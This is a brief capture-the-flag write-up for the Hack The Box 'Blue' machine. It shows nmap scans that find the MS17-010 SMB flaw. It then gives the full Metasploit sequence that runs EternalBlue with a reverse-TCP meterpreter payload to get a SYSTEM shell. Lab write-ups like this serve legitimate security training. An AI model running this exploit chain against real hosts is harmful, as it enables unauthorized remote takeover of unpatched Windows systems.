# HTB - Blue

## Summary

This is a trivially easy box that just involves using EternalBlue in metasploit to gain a root SYSTEM shell  

<br />

## Scanning

Initial nmap scan shows several Windows ports open (135, 139, 445), including SMB: 445  

We can further enumerate SMB with:
- `nmap -sV -sC -p 445 10.10.10.40`

From that, smb-os-discovery shows us that this is Windows 7 Service Pack 1  

Windows 7 Service pack 1 may be vulnerable to EternalBlue  

To further enumerate this potential vulnerability, we can run:
- `nmap --script "safe and vuln" -p 445 10.10.10.40`

The output looks like this:
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

So yes, this thing is vulnerable to EternalBlue  

<br />

## Metasploit

This is pretty straight forward:
```
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> show options
msf> set LHOST tun0
msf> set LPORT 8686
msf> set RHOSTS 10.10.10.40
msf> run
msf> shell
```

Then you just use `dir` and `type` to find the user flag and admin flag
